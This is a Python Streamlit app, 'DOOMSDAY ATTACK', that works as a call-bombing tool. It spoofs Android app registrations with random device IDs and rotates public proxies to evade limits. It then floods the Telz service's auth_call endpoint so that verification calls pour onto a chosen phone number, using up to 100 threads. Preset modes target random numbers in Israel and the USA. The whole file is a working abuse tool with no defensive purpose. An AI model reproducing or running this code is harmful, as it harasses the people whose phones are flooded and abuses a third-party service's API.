import streamlit as st
import subprocess
import sys
import random
import time
import uuid
import string
import json
import webbrowser
import os
from concurrent.futures import ThreadPoolExecutor

# --- إعدادات الصفحة (نفس الألوان المرعبة) ---
st.set_page_config(page_title="DOOMSDAY ATTACK - GX3GX3", page_icon="💀", layout="wide")

st.markdown("""
    <style>
    #MainMenu {visibility: hidden;}
    footer {visibility: hidden;}
    header {visibility: hidden;}
    .stDeployButton {display:none;}
    .main { background-color: #000000; color: #ff0000; }
    .doom-frame { border: 4px solid #ff0000; padding: 20px; border-radius: 15px; box-shadow: 0 0 30px #ff0000; background-color: #0a0000; text-align: center; }
    .stats-box { border: 2px solid #ffffff; padding: 15px; border-radius: 10px; background-color: #1a0000; text-align: center; margin: 10px; }
    </style>
    """, unsafe_allow_html=True)

# --- نظام التحقق من المفتاح ---
if 'authenticated' not in st.session_state:
    st.session_state.authenticated = False

if not st.session_state.authenticated:
    st.markdown('<div class="doom-frame">', unsafe_allow_html=True)
    st.image("https://files.catbox.moe/3cq9i1.jpg", use_container_width=True)
    st.markdown("<h1 style='color: red;'>🔒 SYSTEM LOCKED</h1>", unsafe_allow_html=True)
    user_key = st.text_input("ENTER ACCESS KEY:", type="password")
    if st.button("ACTIVATE 🔥"):
        if user_key == "aligx3gx3":
            st.session_state.authenticated = True
            st.rerun()
    st.stop()

# --- واجهة البداية ---
st.markdown('<div class="doom-frame">', unsafe_allow_html=True)
st.image("https://files.catbox.moe/3cq9i1.jpg", use_container_width=True)
st.markdown("<h1 style='color: #ff0000;'>هجـوم يوم القيامة</h1>", unsafe_allow_html=True)
st.markdown("</div>", unsafe_allow_html=True)

# --- الكود الأصلي (بدون حذف أي حرف) ---

def install_libs():
    libs = ['requests', 'termcolor', 'pyfiglet']
    for lib in libs:
        try:
            __import__(lib)
        except ImportError:
            subprocess.check_call([sys.executable, "-m", "pip", "install", lib])

install_libs()

import requests
from termcolor import colored
import pyfiglet

def generate_unique_ids():
    timestamp = int(time.time() * 1000)
    random_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=16))
    unique_uuid = uuid.uuid4()
    return timestamp, random_id, unique_uuid

def fetch_internal_proxies():
    proxies = []
    urls = [
        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all",
        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=10000&country=all"
    ]
    for url in urls:
        try:
            res = requests.get(url, timeout=10)
            if res.status_code == 200:
                for line in res.text.splitlines():
                    if ":" in line: proxies.append(line.strip())
        except: pass
    return proxies

def is_proxy_working(proxy_dict):
    try:
        response = requests.get("https://www.google.com", proxies=proxy_dict, timeout=3)
        return response.status_code == 200
    except: return False

def load_proxies(filename="gx1gx1.txt"):
    all_proxies = []
    if os.path.exists(filename):
        with open(filename, "r") as f:
            all_proxies.extend([l.strip() for l in f.read().splitlines() if l.strip()])
    internal = fetch_internal_proxies()
    all_proxies.extend(internal)
    return list(set(all_proxies))

def get_working_proxy(proxies_list):
    for _ in range(10):
        if not proxies_list: return None
        raw_proxy = random.choice(proxies_list)
        proxy_url = f"http://{raw_proxy}" if not raw_proxy.startswith(("http", "socks")) else raw_proxy
        proxy_dict = {"http": proxy_url, "https": proxy_url}
        if is_proxy_working(proxy_dict): return proxy_dict
    return None

def send_install_request(url, headers, payload, proxy=None):
    try:
        response = requests.post(url, data=payload, headers=headers, proxies=proxy, timeout=10)
        return response.ok and "ok" in response.text
    except: return False

def send_auth_call_request(url, headers, payload, proxy=None):
    try:
        response = requests.post(url, data=payload, headers=headers, proxies=proxy, timeout=10)
        return response.ok and "ok" in response.text
    except: return False

# --- إدارة الحالة والعدادات ---
if 'stats' not in st.session_state: st.session_state.stats = {"ok": 0, "error": 0}
if 'running' not in st.session_state: st.session_state.running = False

# --- واجهة التحكم ---
st.markdown('<div class="doom-frame">', unsafe_allow_html=True)
attack_mode = st.radio("SELECT MODE:", ["Manual Entry", "Random Israel Attack 🇮🇱", "Random USA Attack 🇺🇸"])

if attack_mode == "Manual Entry":
    col1, col2 = st.columns(2)
    with col1: country_code = st.text_input("🌍 Country Code:", value="964")
    with col2: number = st.text_input("📱 Phone Number:")
else:
    country_code = "972" if "Israel" in attack_mode else "1"
    number = "RANDOM"
    st.warning(f"AUTO-ATTACK ENABLED ON {attack_mode}")

threads_count = st.slider("☣️ ATTACK POWER:", 1, 100, 20)
st.markdown('</div>', unsafe_allow_html=True)

# --- دالة الهجوم (مطابقة لبايثون 100%) ---
def worker_task(c_code, phone_num):
    foreign_langs = ["en", "fr", "de", "tr", "es", "pt", "it", "ko", "ru", "ja", "zh", "ar", "hi", "he"]
    proxies_list = load_proxies("gx1gx1.txt")
    install_url = "https://api.telz.com/app/install"
    auth_call_url = "https://api.telz.com/app/auth_call"
    headers = {'User-Agent': "Telz-Android/17.5.17", 'Content-Type': "application/json"}

    while st.session_state.running:
        final_target = phone_num if phone_num != "RANDOM" else "".join(random.choices(string.digits, k=9))
        foxx, fox, foxer = generate_unique_ids()
        random_android_version = str(random.randint(7, 14))
        random_lang = random.choice(foreign_langs)
        proxy = get_working_proxy(proxies_list)

        payload_install = json.dumps({
            "android_id": fox, "app_version": "17.5.17", "event": "install",
            "google_exists": "yes", "os": "android", "os_version": random_android_version,
            "play_market": True, "ts": foxx, "uuid": str(foxer)
        })

        try:
            if send_install_request(install_url, headers, payload_install, proxy):
                payload_auth_call = json.dumps({
                    "android_id": fox, "app_version": "17.5.17", "attempt": "0",
                    "event": "auth_call", "lang": random_lang, "os": "android",
                    "os_version": random_android_version, "phone": f"+{c_code}{final_target}",
                    "ts": foxx, "uuid": str(foxer)
                })
                if send_auth_call_request(auth_call_url, headers, payload_auth_call, proxy):
                    st.session_state.stats["ok"] += 1
                else: st.session_state.stats["error"] += 1
            else: st.session_state.stats["error"] += 1
        except: st.session_state.stats["error"] += 1
        time.sleep(0.01)

# أزرار التشغيل
if st.button("🔥 START DOOMSDAY"):
    if number:
        st.session_state.running = True
        with ThreadPoolExecutor(max_workers=threads_count) as executor:
            for _ in range(threads_count):
                executor.submit(worker_task, country_code, number)
    else: st.error("ENTER NUMBER!")

if st.button("🛑 STOP"):
    st.session_state.running = False
    st.rerun()

# --- عدادات النتائج بالإنجليزية ---
st.markdown('<div class="doom-frame">', unsafe_allow_html=True)
col_ok, col_err = st.columns(2)
with col_ok:
    st.markdown(f'''<div class="stats-box"><h2 style="color: #00ff00;">SUCCESS</h2><h1>{st.session_state.stats["ok"]}</h1></div>''', unsafe_allow_html=True)
with col_err:
    st.markdown(f'''<div class="stats-box"><h2 style="color: #ff0000;">FAILED</h2><h1>{st.session_state.stats["error"]}</h1></div>''', unsafe_allow_html=True)
st.markdown('</div>', unsafe_allow_html=True)
